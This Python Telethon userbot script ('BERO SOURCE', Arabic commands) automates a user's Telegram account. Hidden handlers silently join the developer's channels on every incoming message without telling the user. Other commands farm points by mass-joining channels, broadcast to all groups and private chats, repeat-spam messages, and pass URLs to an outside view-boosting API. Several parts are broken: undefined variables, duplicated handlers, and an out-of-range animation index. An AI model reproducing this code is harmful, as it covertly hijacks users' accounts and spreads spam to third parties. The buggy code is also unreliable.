import telethon
from telethon import events
from config import *
import os
import logging
import asyncio
import time
from telethon.tl import functions, types
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.utils import get_display_name
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events
from collections import deque
from telethon import functions
from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
    UserNotMutualContactError,
    UserPrivacyRestrictedError,
)
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.types import InputPeerUser
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl import functions
from hijri_converter import Gregorian
from telethon.tl.functions.channels import LeaveChannelRequest
import base64
import datetime
from payment import *
from help import *
from checktele import *
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
import requests
# -

sython.start()
c = requests.session()
bot_username = '@eeobot'
bot_usernamee = '@A_MAN9300BOT'
bot_usernameee = '@MARKTEBOT'
bot_usernameeee = '@xnsex21bot'
bot_usernn = '@MHDN313bot'
y = datetime.datetime.now().year
m = datetime.datetime.now().month
dayy = datetime.datetime.now().day
day = datetime.datetime.now().strftime("%A")
m9zpi = f"{y}-{m}-{dayy}"
sec = time.time()

LOGS = logging.getLogger(__name__)

DEVS = [
    5159123009,
]
DEL_TIME_OUT = 10
normzltext = "1234567890"
namerzfont = normzltext
name = "Profile Photos"
time_name = ["off"]
time_bio = ["off"]


@sython.on(events.NewMessage)
async def join_channel(event):
    try:
        await sython(JoinChannelRequest("@Sero_Bots"))
    except BaseException:
        pass
        
@sython.on(events.NewMessage)
async def join_channel(event):
    try:
        await sython(JoinChannelRequest("@B_r_i"))
    except BaseException:
        pass
      

@sython.on(events.NewMessage)
async def join_channel(event):
    try:
        await sython(JoinChannelRequest("@B_r_0"))
    except BaseException:
        pass  
        
        




@sython.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر"))
async def _(event):
    await event.edit(commands)

@sython.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit("يتم اجراء فحص | 𝐁𝐄𝐑𝐎 𝐒𝐎𝐔𝐑𝐂𝐄")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
**𝗦𝗢𝗨𝗥𝗖𝗘 𝗪𝗢𝗥𝗞𝗦 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬
╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍
 ► 𝐁𝐄𝐑𝐎 𝐒𝐎𝐔𝐑𝐂𝐄
 ► PING : `{ms}`
 ► DATE : `{m9zpi}`
 ► ID : `{event.sender_id}`
 ► DEVLOPLER : @MQQ_Q**
''')


@sython.on(events.NewMessage(outgoing=True, pattern=r"\.م1"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec1)


@sython.on(events.NewMessage(outgoing=True, pattern=r"\.م2"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec2)


@sython.on(events.NewMessage(outgoing=True, pattern=r"\.م3"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec3)


@sython.on(events.NewMessage(outgoing=True, pattern=r"\.م4"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec4)

@sython.on(events.NewMessage(outgoing=True, pattern=r"\.م5"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(sec5)


@sython.on(events.NewMessage(outgoing=True, pattern=r"\.اوامر النشر"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(nashr)

@sython.on(events.NewMessage(outgoing=True, pattern=r"\.اوامر التكرار"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(tkrar)

@sython.on(events.NewMessage(outgoing=True, pattern=r"\.اوامر الاذاعه"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(broad)

@sython.on(events.NewMessage(outgoing=True, pattern=r"\.اوامر التسليه"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(tslia)

ownerhson_id = 5561152568
@sython.on(events.NewMessage(outgoing=False, pattern='/start'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply('▷ 𝐁𝐄𝐑𝐎 𝐒𝐎𝐔𝐑𝐂𝐄 ◁ | مرحبا يامطور سورسي')

@sython.on(events.NewMessage(outgoing=True, pattern=r"\.اعادة تشغيل"))
async def update(event):
    await event.edit("▷ 𝐁𝐄𝐑𝐎 𝐒𝐎𝐔𝐑𝐂𝐄 ◁ يتم اعاده التشغيل ")
    await sython.disconnect()
    await sython.send_message("me", "`اكتملت اعادة تشغيل السورس !`")

@sython.on(events.NewMessage(outgoing=True, pattern=".تجميع المليار"))
async def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await sython(JoinChannelRequest('Sero_Bots'))
    channel_entity = await sython.get_entity(bot_username)
    await sython.send_message(bot_username, '/start')
    await asyncio.sleep(4)
    msg0 = await sython.get_messages(bot_username, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await sython.get_messages(bot_username, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await sython(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await sython.send_message(event.chat_id, f"**تم الانتهاء من التجميع | الحمدالله رب العالمين**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await sython(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await sython(ImportChatInviteRequest(bott))
            msg2 = await sython.get_messages(bot_username, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await sython.get_messages(bot_username, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await sython.send_message(event.chat_id, "**تم الانتهاء من التجميع | الحمدالله رب العالمين**")

@sython.on(events.NewMessage(outgoing=True, pattern=".تجميع الجوكر"))
async def _(event):

    await event.edit("**جاري تجميع النقاط في بوت تمويل الجوكر**")
    joinu = await sython(JoinChannelRequest('Sero_Bots'))
    channel_entity = await sython.get_entity(bot_usernamee)
    await sython.send_message(bot_usernamee, '/start')
    await asyncio.sleep(4)
    msg0 = await sython.get_messages(bot_usernamee, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await sython.get_messages(bot_usernamee, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await sython(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await sython.send_message(event.chat_id, f"**تم الانتهاء من التجميع | الحمدالله رب العالمين**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await sython(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await sython(ImportChatInviteRequest(bott))
            msg2 = await sython.get_messages(bot_usernamee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await sython.get_messages(bot_usernamee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await sython.send_message(event.chat_id, "**تم الانتهاء من التجميع | الحمدالله رب العالمين**")

@sython.on(events.NewMessage(outgoing=True, pattern=".تجميع العقاب"))
async def _(event):

    await event.edit("**جاري تجميع النقاط في تمويل العقاب**")
    joinu = await sython(JoinChannelRequest('Sero_Bots'))
    channel_entity = await sython.get_entity(bot_usernameee)
    await sython.send_message(bot_usernameee, '/start')
    await asyncio.sleep(4)
    msg0 = await sython.get_messages(bot_usernameee, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await sython.get_messages(bot_usernameee, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await sython(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await sython.send_message(event.chat_id, f"**تم الانتهاء من التجميع | الحمدالله رب العالمين**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await sython(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await sython(ImportChatInviteRequest(bott))
            msg2 = await sython.get_messages(bot_usernameee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await sython.get_messages(bot_usernameee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await sython.send_message(event.chat_id, "**تم الانتهاء من التجميع | الحمدالله رب العالمين**")


@sython.on(events.NewMessage(outgoing=True, pattern=".تجميع العرب"))
async def _(event):

    await event.edit("**جاري تجميع النقاط في بوت العرب للتمويل**")
    joinu = await sython(JoinChannelRequest('Sero_Bots'))
    channel_entity = await sython.get_entity(bot_usernameeee)
    await sython.send_message(bot_usernameeee, '/start')
    await asyncio.sleep(4)
    msg0 = await sython.get_messages(bot_usernameeee, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await sython.get_messages(bot_usernameeee, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await sython(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await sython.send_message(event.chat_id, f"**تم الانتهاء من التجميع | الحمدالله رب العالمين**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await sython(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await sython(ImportChatInviteRequest(bott))
            msg2 = await sython.get_messages(bot_usernameeee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await sython.get_messages(bot_usernameeee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await sython.send_message(event.chat_id, "**تم الانتهاء من التجميع | الحمدالله رب العالمين**")

@sython.on(events.NewMessage(outgoing=True, pattern=".تجميع مهدويون"))
async def _(event):

    await event.edit("**جاري تجميع النقاط في بوت مهدويون**")
    joinu = await sython(JoinChannelRequest('Sero_Bots'))
    channel_entity = await sython.get_entity(bot_usernn)
    await sython.send_message(bot_usernn, '/start')
    await asyncio.sleep(4)
    msg0 = await sython.get_messages(bot_usernn, limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await sython.get_messages(bot_usernn, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)

        list = await sython(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await sython.send_message(event.chat_id, f"**تم الانتهاء من التجميع | الحمدالله رب العالمين**")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await sython(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await sython(ImportChatInviteRequest(bott))
            msg2 = await sython.get_messages(bot_usernn, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await sython.get_messages(bot_usernn, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await sython.send_message(event.chat_id, "**تم الانتهاء من التجميع | الحمدالله رب العالمين**")


@sython.on(events.NewMessage(outgoing=True, pattern=r"\.ايقاف النشر التلقائي"))
async def update(event):
    await event.edit("**جاري ايقاف النشر التلقائي**")
    await sython.disconnect()
    await sython.send_message("me", "**اكتمل ايقاف النشر التلقائي**")

@sython.on(events.NewMessage(outgoing=True, pattern=r"\.ايقاف التكرار"))
async def update(event):
    await event.edit("**جاري ايقاف التكرار**")
    await sython.disconnect()
    await sython.send_message("me", "**اكتمل ايقاف التكرار**")


LOGS = logging.getLogger(__name__)

logging.basicConfig(
    format="[%(levelname)s- %(asctime)s]- %(name)s- %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
)

async def join_channel():
    try:
        await sython(JoinChannelRequest("@Sero_Bots"))
    except BaseException:
        pass
 
 
GCAST_BLACKLIST = [
    -1001884452589,
    -1001884452589,
]

DEVS = [
    5159123009,
]

def calc(num1, num2, fun):
    if fun == "+":
        return num1 + num2
    elif fun == "-":
        return num1 - num2
    elif fun == "*":
        return num1 * num2
    elif fun == "X":
        return num1 * num2
    elif fun == "x":
        return num1 * num2
    elif fun == "/":
        return num1 / num2
    elif fun == "÷":
        return num1 / num2
    else:
        return "خطأ"



@sython.on(events.NewMessage(outgoing=True, pattern=".احسب (.*)"))
async def _(event):
    try:
        msg = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 2)
        num1 = int(msg[0])
        num2 = int(msg[2])
        fun = str(msg[1])
        await event.edit(f''' الناتج = `{calc(num1, num2, fun)}`''')
    except:
        await event.edit('''خطأ, يرجى ادخال الرقم مثل :
7 + 7
7 - 7
7 x 7
7 ÷ 7''')


@sython.on(events.NewMessage(outgoing=True, pattern=".ستوري (.*)"))
async def _(event):
    try:
        rashq = event.pattern_match.group(1)
        if rashq:
            url = rashq
            response = requests.get('https://ber-lin.online/API/SERVICE-API/berothon.php?&type=story&url=' + url)
            
            if response.status_code == 200:
                content = response.text
                await event.edit(content)
            else:
                await event.edit(f'Error: Unable to fetch content from the URL. Status code: {response.status_code}')
    except Exception as e:
        await event.edit(f'Error: {e}')

@sython.on(events.NewMessage(outgoing=True, pattern=".رشق (.*)"))
async def _(event):
    try:
        rashq = event.pattern_match.group(1)
        if rashq:
            url = rashq
            response = requests.get('https://ber-lin.online/API/SERVICE-API/berothon.php?url=' + url)
            
            if response.status_code == 200:
                content = response.text
                await event.edit(content)
            else:
                await event.edit(f'Error: Unable to fetch content from the URL. Status code: {response.status_code}')
    except Exception as e:
        await event.edit(f'Error: {e}')

@sython.on(events.NewMessage(outgoing=True, pattern=".للكروبات(?: |$)(.*)"))
async def gcast(event):
    sython = event.pattern_match.group(1)
    if sython:
        msg = sython
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "**⌔∮ يجب الرد على رساله او وسائط او كتابه النص مع الامر**"
        )
        return
    roz = await event.edit("⌔∮ يتم الاذاعة في الخاص انتظر لحضه")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                if chat not in GCAST_BLACKLIST:
                    await event.client.send_message(chat, msg)
                    done += 1
            except BaseException:
                er += 1
    await roz.edit(
        f"**⌔∮  تم بنجاح الأذاعة الى ** `{done}` **من الدردشات ، خطأ في ارسال الى ** `{er}` **من الدردشات**"
    )


@sython.on(events.NewMessage(outgoing=True, pattern=".للخاص(?: |$)(.*)"))
async def gucast(event):
    sython = event.pattern_match.group(1)
    if sython:
        msg = sython
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "**⌔∮ يجب الرد على رساله او وسائط او كتابه النص مع الامر**"
        )
        return
    roz = await event.edit("⌔∮ يتم الاذاعة في الخاص انتظر لحضه")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                if chat not in DEVS:
                    await event.client.send_message(chat, msg)
                    done += 1
            except BaseException:
                er += 1
    await roz.edit(
        f"**⌔∮  تم بنجاح الأذاعة الى ** `{done}` **من الدردشات ، خطأ في ارسال الى ** `{er}` **من الدردشات**"
    )

@sython.on(events.NewMessage(outgoing=True, pattern=".تكرار (.*)"))
async def spammer(event):
    sandy = await event.get_reply_message()
    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    await spam_function(event, sandy, cat, sleeptimem, sleeptimet)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):

    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await _catutils.unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass


@sython.on(events.NewMessage(outgoing=True, pattern=".مؤقت (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
  
 
    
@sython.on(events.NewMessage(outgoing=True, pattern=".سورس"))
async def _(event):
      await event.reply("""السـورس يعمـل | 𝙗𝙚𝙧𝙤 𝙨𝙤𝙪𝙧𝙘𝙚
╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍

- المطور : بيرو

- سورس بسيط يحتوي على الاوامر المهمة التي تحتاجها

قناة السورس : https://t.me/Sero_Bots
╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍"""
)

@sython.on(events.NewMessage(outgoing=True, pattern=".مطور"))
async def _(event):
      await event.reply("""BERO OWNER : @MQQ_Q"""
)

@sython.on(events.NewMessage(outgoing=True, pattern=".حلويات"))
async def _(event):
    event = await event.edit("candy")
    deq = deque(list("🍦🍧🍩🍪🎂🍰🧁🍫🍬🍭"))
    for _ in range(100):
        await asyncio.sleep(0.4)
        await event.edit("".join(deq))
        deq.rotate(1)

@sython.on(events.NewMessage(outgoing=True, pattern=".قلوب"))
async def _(event):
    animation_interval = 0.3
    animation_ttl = range(54)
    event = await event.edit("🖤")
    animation_chars = [
        "❤️",
        "🧡",
        "💛",
        "💚",
        "💙",
        "💜",
        "🖤",
        "💘",
        "💝",
        "❤️",
        "🧡",
        "💛",
        "💚",
        "💙",
        "💜",
        "🖤",
        "💘",
        "💝",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 18])

@sython.on(events.NewMessage(outgoing=True, pattern=".العد التنازلي"))
async def _(event):
    animation_interval = 0.3
    animation_ttl = range(54)
    event = await event.edit("🔟")
    animation_chars = [
        "9️⃣",
        "8️⃣",
        "7️⃣",
        "6️⃣",
        "5️⃣",
        "4️⃣",
        "3️⃣",
        "2️⃣",
        "1️⃣",
        "0️⃣",
        "🆘",

    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 18])

        
@sython.on(events.NewMessage(outgoing=True, pattern=".قمر"))
async def _(event):
    event = await event.edit("قمر")
    deq = deque(list("🌗🌘🌑🌒🌓🌔🌕🌖"))
    for _ in range(48):
        await asyncio.sleep(0.2)
        await event.edit("".join(deq))
        deq.rotate(1)
        
@sython.on(events.NewMessage(outgoing=True, pattern=".قمور"))
async def _(event):
    event = await event.edit("قمور")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("قمور..")
    animation_chars = [
        "🌗",
        "🌘",
        "🌑",
        "🌒",
        "🌓",
        "🌔",
        "🌕",
        "🌖",
        "🌗",
        "🌘",
        "🌑",
        "🌒",
        "🌓",
        "🌔",
        "🌕",
        "🌖",
        "🌗",
        "🌘",
        "🌑",
        "🌒",
        "🌓",
        "🌔",
        "🌕",
        "🌖",
        "🌗",
        "🌘",
        "🌑",
        "🌒",
        "🌓",
        "🌔",
        "🌕",
        "🌖",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 32])






print("- sython Userbot Running ..")
sython.run_until_disconnected()
